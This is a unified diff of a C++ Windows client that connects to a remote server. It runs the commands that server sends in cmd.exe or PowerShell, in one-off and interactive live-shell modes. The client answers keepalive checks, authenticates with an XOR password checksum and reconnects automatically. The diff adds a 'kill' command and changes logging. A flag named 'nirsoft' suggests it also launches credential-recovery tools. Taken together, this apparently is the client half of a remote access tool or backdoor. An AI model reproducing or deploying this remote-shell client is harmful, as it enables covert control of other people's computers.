@@ -34,12 +34,11 @@ void client::data_parser(string type, int size, string data)
 			<< "TEXT: " << data << endl;
 	}
 	else if (type == "ALIV") {
-		cout << endl << "isAlive() -> return true;" << endl;
+
 		send_data("OK", "ALIV");
 	}
 	else if (type == "CMDO") { // execute only CMD(O)nce
 		cmd_init(CommandPrompt, false);
-		read_and_send();
 		command(data);
 		cout << "cmd.exe: \"" << data << "\"" << endl;
 	}
@@ -68,7 +67,7 @@ void client::data_parser(string type, int size, string data)
 			string type, data;
 			recv_data(type, data);
 			if (type == "CMDC" && active) {
-				cout << ((active_prompt == CommandPrompt) ? "cmd.exe" : "powershell.exe") << " live shell command: \"" << data << "\"" << endl;
+				cout << endl << ((active_prompt == CommandPrompt) ? "cmd.exe" : "powershell.exe") << " live shell command: \"" << data << "\"" << endl;
 				command(data);
 			}
 			else {
@@ -76,18 +75,30 @@ void client::data_parser(string type, int size, string data)
 			}
 		}
 	}
-	else if (type == "CMDE") { // command prompt shell interactive END
-		cout << "TYPE: " << type << endl
-			<< "SIZE: " << size << endl
-			<< "DATA: " << data << endl;
+	else if (type == "KYSI") { //KILL
+		terminate_open();
+		endme_cmd();
+		endme();
 	}
 	else if (type == "AUTH") {
 		int socket_id = atoi(data.substr(4).c_str());
 		srand(socket_id);
 		int sum = 0;
-		for (auto i : connect_password) { sum += ((i ^ socket_id) ^ rand()); } // XOR's every char in password with client_num and random sequence made by socket_num
-		cout << "Got Connection => Sending Password " << endl << "auth(" << socket_id << ", " << connect_password << ")" << " = " << sum << endl;
-		cout << "Authorization => ";
+		cout << "Got Auth Ticket - [" << socket_id << "]" << endl;
+		cout << endl << "Auth(" << socket_id << ", " << connect_password << ")" << endl;
+		vector<int> sum_items;
+		for (auto i : connect_password) {
+			int random = rand();
+			sum += ((i ^ socket_id) ^ random);
+			sum_items.push_back(((i ^ socket_id) ^ random));
+			cout << endl << "Key-Part: (" << i << " ^ " << socket_id << ") ^ " << random << " = (" << ((i ^ socket_id) ^ random) << ")" << endl;
+		} // XOR's every char in password with client_num and random sequence made by socket_num
+		cout << endl;
+		for (auto integer : sum_items) {
+			cout << "(" << integer << ") + ";
+		}
+		cout << "\b\b\b = ((" << sum << "))" << endl;
+		cout << endl << "Authorization => ";
 		send_data(to_string(sum), "CERT");
 		string type, data;
 		recv_data(type, data);
@@ -153,7 +164,8 @@ bool client::check_error(int status)
 {
 	if (status == SOCKET_ERROR || status == INVALID_SOCKET) {
 		if (WSAGetLastError() == 10054 || WSAGetLastError() == 10061 || WSAGetLastError() == 10057) {
-			cout << "Presumably disconnected from server reconnecting in (1s)" << endl;
+			auto time_now = time(nullptr);
+			cout << endl << "[" << std::put_time(gmtime(&time_now), "%T") << "] Presumably disconnected from server, Trying to reconnect..." << endl;
 			Sleep(1000);
 			closesocket(active_socket);
 			active_socket = socket(AF_INET, SOCK_STREAM, 0);
@@ -526,7 +538,7 @@ bool client::initilize_process(string path, string working_directory = "C:\\Wind
 		return false;
 	}
 	else {
-		cout << "[SUCESS: Created process (" << process_info.hProcess << "|\"" << path << "\")]" << endl;
+		cout << endl << "Created process (" << process_info.hProcess << "|\"" << path << "\")]" << endl;
 		active = true;
 		nirsoft = false;
 		return true;
@@ -573,7 +585,7 @@ void client::terminate_open()
 	if (process_info.hProcess != NULL) {
 		char szProcessName[MAX_PATH] = "<unknown>";
 		GetModuleFileNameExA(process_info.hProcess, 0, szProcessName, sizeof(szProcessName));
-		cout << endl << "[SUCESS: Closed (" << process_info.hProcess << "|\"" << szProcessName << "\")]" << endl;
+		cout << endl << "Closed (" << process_info.hProcess << "|\"" << szProcessName << "\")]" << endl;
 		TerminateProcess(process_info.hProcess, 0);
 		CloseHandle(process_info.hProcess);
 	}
@@ -668,7 +680,7 @@ void client::endme_cmd()
 	active = false;
 	TerminateProcess(process_info.hProcess, 0);
 	CloseHandle(process_info.hProcess);
-	cout << endl << "[SUCCESS: (" << ((process_info.hProcess == NULL) ? "UNKWN" : proc_id.str()) << ") commited !alive]" << endl;
+	cout << endl << "(" << ((process_info.hProcess == NULL) ? "UNKWN" : proc_id.str()) << ") commited !alive]" << endl;
 }
 
 bool client::alive_cmd()
